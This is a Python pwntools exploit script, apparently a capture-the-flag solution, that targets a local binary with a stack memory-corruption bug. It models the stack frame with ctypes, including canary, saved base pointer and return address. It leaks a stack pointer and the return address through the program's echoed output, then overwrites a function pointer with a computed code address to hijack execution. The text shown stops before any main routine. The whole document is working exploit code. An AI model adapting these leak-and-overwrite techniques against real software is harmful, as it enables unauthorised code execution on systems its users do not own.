#!/bin/python

import IPython
from pwn import *
from ctypes import *
from argparse import *


class Stack_Vars(Structure):
    _pack_ = 1
    _fields_ = [("user_in",     c_uint32),
                ("__pad1__",    c_uint64 * 3),
                ("buzz_ptr",    c_uint64),

                ("__pad2__",    c_uint32),
                ("iter_idx",    c_uint32),

                ("ans_ptr",     c_uint64),
                ("ans_out",     c_uint64),

                ("canary",      c_uint64),
                ("saved_rbp",   c_uint64),
                ("ret_rip",     c_uint64),
                ]


def get_quad_word(proc: process, count: int, payload: bytes):
    proc.send(payload[:count])
    proc.recvuntil(b'You entered: ')
    proc.recv(count)

    return proc.recvline()[:-1].ljust(8, b'\x00')[:8]


def get_stack_offset(attr: str):
    return getattr(Stack_Vars, attr, -1).offset


def set_stack_attr(proc: process, obj: Stack_Vars, attr: str):
    val = u64(get_quad_word(proc, get_stack_offset(attr), bytes(obj)))
    setattr(obj, attr, val)


def leak_rip(proc: process, payload: Stack_Vars):
    # rip addr + 1
    payload.ans_ptr += get_stack_offset('ret_rip') - get_stack_offset('buzz_ptr') + 4
    payload.ans_out = payload.ans_ptr 
    print(f'ans_ptr addr: {hex(payload.ans_ptr)}')

    proc.clean()
    proc.send(bytes(payload)[:get_stack_offset('ans_out')+8])
    proc.recvuntil(b'Correct answer: ')

    rip = b''
    for i in range(0, 8):
        rip += proc.recv(1)
        if rip[i] == ord('\n'):
            rip = rip[:-1]
            break

    return rip.ljust(8, b'\x00')


def get_payload(args: Namespace, proc: process):
    while True:
        payload = Stack_Vars()
        memset(addressof(payload), 0x22, sizeof(payload))

        for _ in range(5):
            get_quad_word(proc, 1, b'A')
        payload.iter_idx = -11
        set_stack_attr(proc, payload, 'ans_ptr')

        buzz_addr = payload.ans_ptr
        leaked_rip = u64(leak_rip(proc, payload))
        print(f"rip: {hex(leaked_rip)}")

        payload.ans_out = payload.ans_ptr
        payload.ans_ptr = buzz_addr - 4
        payload.buzz_ptr = (leaked_rip // 16 ** 4) * (16 ** 4) + 0x12c9

        print(f"Ans ptr: {hex(payload.ans_ptr)}")
        print(f"Ans out: {hex(payload.ans_out)}")

        payload.iter_idx = 15
        return bytes(payload)

def send_in_payload(payload: bytes, proc: process):
    proc.sendline(payload)
